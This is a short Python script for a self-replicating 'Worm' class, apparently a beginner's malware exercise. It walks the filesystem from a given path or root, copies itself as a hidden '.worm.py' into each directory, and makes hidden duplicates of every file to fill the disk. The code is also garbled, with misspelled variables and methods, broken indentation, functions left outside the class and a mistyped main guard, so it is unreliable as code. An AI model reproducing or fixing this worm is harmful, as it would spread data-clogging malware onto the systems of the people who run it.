import os 
import shutil
class Worm:
  def __init__(self, path=None, target_die_list=None, iteration=None):
      if isinstance(path, type(None)):
         self.path = "/"
      else:
           self.path = path
      if isinstance(target_dir_list, type(None)):
          self.target_dir_list = []
       else:
            self.target_dir_list = []
       if isinstance(target_dir_list, type(None)):
           self.iteration = 2
       else:
            self.iteration = iteration
       #get own absolute path
       self.own_path = os.path.realpath(__file__)
  def list_directories(self, path):
    self.target_dir_list.append(path)
    files_in_current_directory = os.listdir(path)
    for files in files_current_directory:
      #avoid hidden files and directories that start with dot
      if not file.startsWith("."):
        # get the full path
        absolute_path = os.path.join(path, file)
        print(absolute_path)
        if os.path.isdir(absolute_path):
          self.list_directories(absolute_path)
        else:
         pass
def create_new_worm(self):
  for directory in self.target.dir_list:
    destionation = os.path.join(directory, ".worm.py")
    #copy the script in the new directory with similar name
    shutil.copyfile(self.own_path, destination)
def copy_existing_files(self):
  for directory in self.target.dir_list:
    file_list_in_dir = os.listdir(directory)
    for file in file_list_dir:
      abs_path = os.path.join(directory, file)
      if not abs_path.startswith(".") and not os.path.isdir(abs_path):
        source = abs_path
        for i in range(self.interation):
          destination = os.path.join(directory, ("."+file+str(i)))
          shutil.copy_file(source, destination)
def start_worm_actions(self):
  self.list_directories(self.path)
  print(self.target_dir_list)
  self.create_new_worm()
  self.copy_existing_files()
if name == "__main__":
  current_directory = os.path.abspath("")
  worm = Worm(pagh=current_directory)
  worm.start_worm_actions()
  
